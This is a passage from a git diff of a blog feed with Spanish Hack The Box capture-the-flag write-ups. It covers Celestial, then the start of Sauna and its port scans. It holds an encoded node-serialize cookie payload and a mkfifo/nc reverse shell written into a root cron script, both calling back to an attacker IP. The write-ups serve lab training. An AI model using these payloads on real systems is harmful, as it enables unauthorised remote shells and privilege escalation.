UsMTEyLDEwMSw0MCwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwNSwxMTAsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMTEsMTE3LDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwMSwxMTQsMTE0LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTExLDExMCw0MCwzOSwxMDEsMTIwLDEwNSwxMTYsMzksNDQsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDk5LDExMSwxMDAsMTAxLDQ0LDExNSwxMDUsMTAzLDExMCw5NywxMDgsNDEsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTAxLDExMCwxMDAsNDAsMzQsNjgsMTA1LDExNSw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMTQsMTE0LDExMSwxMTQsMzksNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwMSw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwMSwxMTYsODQsMTA1LDEwOSwxMDEsMTExLDExNywxMTYsNDAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNDQsMzIsODQsNzMsNzcsNjksNzksODUsODQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDEyNSwxMCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw1OSwxMCkpfSgpIn0K
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Copiamos el resultado, ingresamos al sitio web de la máquina víctima &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.85:3000/&lt;/code&gt; y con el plugin &lt;strong&gt;Edit this cookie&lt;/strong&gt; cambiamos el valor de la cookie por lo que copiamos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-celestial/celestial-web2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Antes de recargar la página, nos ponemos en escucha por el puerto 443.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.85] 53454
+Connected!
+&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;sun
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya nos encontramos dentro de la máquina como el usuario &lt;strong&gt;sun&lt;/strong&gt; y antes de todo, vamos a hacer un [[Tratamiento de la tty]] para trabajar más cómodos y ya podemos visualizar la flag (user.txt). Ahora vamos a ver una forma de escalar privilegios:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sun@sun:~/Documents&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sun&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sun&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sun&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;adm&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,24&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cdrom&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,27&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,30&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dip&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,46&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;plugdev&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,113&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lpadmin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,128&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sambashare&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+sun@sun:~/Documents&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;sun: 
+sun@sun:~/Documents&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /
+sun@sun:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;perm &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; 2&amp;gt;/dev/null
+./usr/lib/eject/dmcrypt-get-device
+./usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
+./usr/lib/policykit-1/polkit-agent-helper-1
+./usr/lib/dbus-1.0/dbus-daemon-launch-helper
+./usr/lib/openssh/ssh-keysign
+./usr/sbin/pppd
+./usr/bin/chsh
+./usr/bin/newgrp
+./usr/bin/pkexec
+./usr/bin/chfn
+./usr/bin/sudo
+./usr/bin/ubuntu-core-launcher
+./usr/bin/gpasswd
+./usr/bin/passwd
+./bin/mount
+./bin/ping6
+./bin/ntfs-3g
+./bin/umount
+./bin/fusermount
+./bin/ping
+./bin/su
+sun@sun:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Podríamos aprovechar el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/pkexec&lt;/code&gt;; sin embargo, vamos a hacerlo de la forma que fue pensada la máquina. Vamos a listan procesos en el sistema que se ejecuten en intervalos regulares y lo haremos con nuestro archivo [[ProcMon]]:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sun@sun:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x procmon.sh 
+sun@sun:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./procmon.sh 
+&amp;lt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;kworker/0:0]
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /usr/sbin/CRON &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; python /home/sun/Documents/script.py &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /home/sun/output.txt&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /root/script.py /home/sun/Documents/script.py&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chown &lt;/span&gt;sun:sun /home/sun/Documents/script.py&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; chattr &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; /home/sun/Documents/script.py&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; /home/sun/Documents/user.txt&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; /home/sun/Documents/script.py
+&amp;lt; /usr/sbin/CRON &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;
+&amp;lt; /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; python /home/sun/Documents/script.py &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /home/sun/output.txt&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /root/script.py /home/sun/Documents/script.py&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chown &lt;/span&gt;sun:sun /home/sun/Documents/script.py&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; chattr &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; /home/sun/Documents/script.py&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; /home/sun/Documents/user.txt&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; /home/sun/Documents/script.py
+^C
+sun@sun:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vemos que se está ejecutando el script en python &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/sun/Documents/script.py&lt;/code&gt; el cual se encuentra en nuestro directorio y a parte, tenemos terminos de escritura. Si pensamos que el usuario &lt;strong&gt;root&lt;/strong&gt;, podríamos editar el archivo para obtener una shell.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sun@sun:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home/sun/Documents/
+sun@sun:~/Documents&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+total 8
+&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt; 1 sun sun 29 Sep 21  2017 script.py
+&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt; 1 sun sun 33 Sep 21  2017 user.txt
+sun@sun:~/Documents&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Modificamos el archivo para&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sun@sun:~/Documents&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;script.py 
+import os
+os.system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.27 4443 &amp;gt;/tmp/f&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+sun@sun:~/Documents&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos ponemos en escucha por el puerto 4443 (cambiamos el puerto debido a que si nos ponemos por el puerto 443 seguiremos recibiendo la conexión del usuario &lt;strong&gt;sun&lt;/strong&gt;) y esperamos a que la tarea se ejecute:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 4443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 4443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.85] 60234
+/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
+# whoami
+root
+# 
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya nos encontramos en la máquina como el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="JavaScript" /><category term="File_Misconfiguration" /><summary type="html">Resolución de la máquina Celestial en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Jerry</title><link href="http://localhost:4000/htb-jerry/" rel="alternate" type="text/html" title="Hack The Box Jerry" /><published>2022-03-15T00:00:00-06:00</published><updated>2022-03-15T00:00:00-06:00</updated><id>http://localhost:4000/htb-jerry</id><content type="html" xml:base="http://localhost:4000/htb-jerry/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jerry/banner-jerry.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;jerry&quot;&gt;Jerry&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.95.&lt;/p&gt;
@@ -3204,1081 +3542,4 @@ bash-4.4# &lt;span class=&quot;nb&quot;&gt;whoami
 bash-4.4#
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Process_Inspection" /><category term="Arbitrary_File_Upload" /><summary type="html">Resolución de la máquina Traceback en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Sauna</title><link href="http://localhost:4000/htb-sauna/" rel="alternate" type="text/html" title="Hack The Box Sauna" /><published>2022-01-31T00:00:00-06:00</published><updated>2022-01-31T00:00:00-06:00</updated><id>http://localhost:4000/htb-sauna</id><content type="html" xml:base="http://localhost:4000/htb-sauna/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-sauna/banner-sauna.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;sauna&quot;&gt;Sauna&lt;/h2&gt;
-&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.175.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.175
-PING 10.10.10.175 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.175&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
-64 bytes from 10.10.10.175: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;139 ms
-
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.175 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
-rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 139.154/139.154/139.154/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.175 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
-Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-28 02:33 CST
-Initiating SYN Stealth Scan at 02:33                                                                                             
-Scanning 10.10.10.175 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]          
-Discovered open port 53/tcp on 10.10.10.175 
-Discovered open port 135/tcp on 10.10.10.175                                                                                     
-Discovered open port 139/tcp on 10.10.10.175  
-Discovered open port 445/tcp on 10.10.10.175  
-Discovered open port 593/tcp on 10.10.10.175  
-Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.175 from 0 to 5 due to 11 out of 19 dropped probes since last increase.
-Discovered open port 636/tcp on 10.10.10.175  
-Discovered open port 88/tcp on 10.10.10.175   
-Discovered open port 49696/tcp on 10.10.10.175
-Discovered open port 9389/tcp on 10.10.10.175
-Discovered open port 389/tcp on 10.10.10.175                                                                                     
-SYN Stealth Scan Timing: About 47.01% &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ETC: 02:34 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0:00:35 remaining&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Discovered open port 3269/tcp on 10.10.10.175 
-Discovered open port 464/tcp on 10.10.10.175
-Increasing send delay &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.175 from 5 to 10 due to 11 out of 15 dropped probes since last increase.
-Discovered open port 49677/tcp on 10.10.10.175                                                                                   
-Discovered open port 49673/tcp on 10.10.10.175
-Discovered open port 49689/tcp on 10.10.10.175  
-Discovered open port 5985/tcp on 10.10.10.175   
-Discovered open port 49674/tcp on 10.10.10.175  
-Discovered open port 49667/tcp on 10.10.10.175  
-Discovered open port 3268/tcp on 10.10.10.175   
-Discovered open port 80/tcp on 10.10.10.175     
-Completed SYN Stealth Scan at 02:34, 65.97s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65535 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.175               
-Host is up, received user-set &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  
-Scanned at 2022-01-28 02:33:22 CST &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;66s      
-Not shown: 65508 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;no-response&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 7 filtered tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;host-unreach&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
-PORT      STATE SERVICE          REASON
-53/tcp    open  domain           syn-ack ttl 127
-80/tcp    open  http             syn-ack ttl 127
-88/tcp    open  kerberos-sec     syn-ack ttl 127
-135/tcp   open  msrpc            syn-ack ttl 127
-139/tcp   open  netbios-ssn      syn-ack ttl 127
-389/tcp   open  ldap             syn-ack ttl 127
-445/tcp   open  microsoft-ds     syn-ack ttl 127
-464/tcp   open  kpasswd5         syn-ack ttl 127
-593/tcp   open  http-rpc-epmap   syn-ack ttl 127
-636/tcp   open  ldapssl          syn-ack ttl 127
-3268/tcp  open  globalcatLDAP    syn-ack ttl 127
-3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
-5985/tcp  open  wsman            syn-ack ttl 127
-9389/tcp  open  adws             syn-ack ttl 127
-49667/tcp open  unknown          syn-ack ttl 127
-49673/tcp open  unknown          syn-ack ttl 127
-49674/tcp open  unknown          syn-ack ttl 127
-49677/tcp open  unknown          syn-ack ttl 127
-49689/tcp open  unknown          syn-ack ttl 127
-49696/tcp open  unknown          syn-ack ttl 127
-
-Read data files from: /usr/bin/../share/nmap
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;66.06 seconds
-           Raw packets sent: 327646 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;14.416MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 57 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.824KB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Mediante la función &lt;a href=&quot;/extractPorts&quot;&gt;extractPorts&lt;/a&gt; definida a nivel de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt; , se obtiene la información más relevante de la captura grepeable.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ extractPorts allPorts
-───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-   1   │ 
-   2   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Extracting information...
-   3   │ 
-   4   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; IP Address: 10.10.10.175
-   5   │     &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Open ports: 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49677,49689,49696
-   6   │ 
-   7   │ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Ports copied to clipboard
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p53&lt;/span&gt;,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49677,49689,49696 10.10.10.175 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-01-28 02:35 CST
-Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.10.10.175
-Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.14s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-
-PORT      STATE SERVICE       VERSION
-53/tcp    open  domain        Simple DNS Plus
-80/tcp    open  http          Microsoft IIS httpd 10.0
-| http-methods: 
-|_  Potentially risky methods: TRACE
-|_http-server-header: Microsoft-IIS/10.0
-|_http-title: Egotistical Bank :: Home
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2022-01-28 15:35:29Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
